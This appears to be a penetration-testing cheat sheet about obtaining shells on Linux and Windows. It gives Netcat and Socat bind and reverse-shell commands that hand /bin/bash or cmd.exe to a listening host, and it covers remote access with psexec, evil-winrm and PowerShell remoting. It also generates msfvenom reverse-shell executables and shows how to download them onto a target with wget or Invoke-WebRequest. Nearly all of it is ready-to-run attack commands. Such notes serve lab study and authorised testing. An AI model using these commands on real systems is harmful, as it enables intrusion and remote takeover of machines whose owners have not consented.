# Linux Shell Breakout 
* spawn a /bin/bash using Python
* https://docs.python.org/3/library/pty.html

```bash
python -c 'import pty;pty.spawn("/bin/bash")';
export TERM=xterm-256color
alias ll='clear ; ls -lasht --color=auto'
# CRTL + Z [backgroud process]
stty raw -echo; fg ; reset
stty column 200 rows 200
```

# Linux Shells

* Connect to a TCP/UDP port with Netcat
* Listen on a TCP/UDP port with Netcat
* Gain Remote Access to a host with Netcat
* Execute a Netcat bind shell
* Execute a Netcat reverse shell
* Netcat vs. Socat
* Socat reverse shells
* SSH shells


## Connect to a TCP/UDP port with Netcat
* -n don't do DNS resolution
* -v verbose

`nc -nv 10.11.0.22 110`

## Listen on a TCP/UDP port with Netcat
* -l start listener
* -p port

`nc -nlvp 4444`

## Execute a Netcat bind shell
* server bind a command shell on a specific port
* -e provide stdin, stout and stderr of a shell

`nc -nlvp 4444 -e cmd.exe`

## Execute a Netcat reverse shell
* client send a command shell to a **host listening on a port**.

```bash
nc -nlvp 4444
nc -nv host 4444 -e /bin/bash
```

## Netcat vs. Socat
* https://nc110.sourceforge.io/
* http://www.dest-unreach.org/socat/doc/socat.html
* -d verbosity
* **socat connect requires a '-' as first address**, 

```bash
echo "Socat Connect"
nc <remote> 80
socat - TCP4:<remote>:80
```

```bash
echo "Socat Listener"
sudo nc -lvp localhost 443
sudo socat TCP4-LISTEN:443 STDOUT
sudo socat TCP4-LISTEN:443 EXEC:/bin/bash
```

```bash
echo "Reverse Shell"
nc -nlvp 4444
nc -nv host 4444 -e /bin/bash
socat -d -d TCP4-LISTEN:443 STDOUT
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

## SSH shells
* -p remote port
* -o stricthostkeychecking=no **avoid this option in real world**
* Online Wargame for beginners https://overthewire.org/wargames/bandit/
* Use the config which is read ~/.ssh/config before /etc/ssh/ssh_config
* https://linuxize.com/post/using-the-ssh-config-file/

ssh kali@localhost -p 22
ssh -o stricthostkeychecking=no webadmin@192.168.0.2 -p 2220

```bash
kali@kali:~/.ssh$ cat config
Host webadmin
        HostName webadmin@192.168.0.2
        User webadmin
        Port 22

kali@kali:~/.ssh$ ssh webadmin
```

# Windows Shells
* Remote shells with PowerShell
* Remote shells with psexec
* Remote shells with evil-winrm
* Remote shells with rdesktop

## Remote shells with PowerShell
* run powerShell as admin
* enable Enable-PSRemoting
* add IP to trustedhosts using wsman
* invoke a remote command or a remote shell
* https://learn.microsoft.com/en-us/powershell/module/microsoft.wsman.management/about/about_wsman_provider?view=powershell-7.2#setting-the-value-of-items-in-the--wsman-drive
* https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works

```powershell
Enable-PSRemoting
Set-Item wsman:\localhost\client\trustedhosts $IP
```

```powershell
Invoke-Command -ComputerName $IP -Credential $USER -ScriptBlock { systeminfo } 
Enter-PSSession -ComputerName $IP -Credential $USER
```

### Setup the local computer with a listener for any IP on HTTP
* Set-WSManQuickConfig: Configures the local computer for remote management. It starts a service opens the firewall.
* https://learn.microsoft.com/en-us/powershell/module/microsoft.wsman.management/about/about_ws-management_cmdlets?view=powershell-7.2

```powershell
Set-WSManQuickConfig
Test-WSMan 
```

## Remote shells with psexec
* download PSExec
* extract it to System32
* create a psexec interactive session -i
* https://learn.microsoft.com/en-us/sysinternals/downloads/psexec

```powershell
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PSTools.zip"
Expand-Archive -Path .\PSTools.zip -DestinationPath C:\Windows\System32\
$RHOST="target IP"
psexec -accepteula
psexec "\\$ROST" -u user -p password -i cmd
psexec "\\$ROST" -u user -p password -i powershell
```

Remote shells with evil-winrm
* https://github.com/Hackplayers/evil-winrm
* -P, --port PORT                  default 5985
* -H, --hash HASH                  NTHash
* -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
* -e, --executables EXES_PATH      C# executables local path
* --spn SPN_PREFIX                 SPN prefix for Kerberos auth (default HTTP)


```bash
./evil-winrm.rb -i IP -u user -p password
```

## Remote shell with rdesktop
* Connect remote desktop from linux

```bash
rdesktop -u user -p password $RHOST
```

# Custom Shell using MSFvenom
* https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
* https://www.offsec.com/metasploit-unleashed/msfvenom/
* staged payloads require Metasploit framework 
* let's use stageless payload instead
* -p use payload
* -f use format
* -a use arch
* -o output
* https://github.com/rsmudge/metasploit-loader/blob/master/src/main.c


```bash
msfvenom -h
msfvenom --list payloads
msfvenom -l platforms
msfvenom -l formats
msfvenom --platform linux -l payloads | grep x86
msfvenom --platform windows -l payloads | grep x64
```

```bash
msfvenom -p linux/x86/shell_reverse_tcp --list-options
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=1234 -f elf -o reverse_shell.elf
msfvenom -p linux/x86/windows/shell_reverse_tcp --list-options
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=1234 -f exe -o reverse_shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=1234 -f exe -o reverse_shell.exe
```

## Download Shell
```bash
sudo python -m http.server 80
```
```bash
$ wget http://IP/reverse_shell.elf
```
```powershell
PS> Invoke-WebRequest -Uri http://IP/reverse_shell.exe -OutFile reverse_shell.exe
```

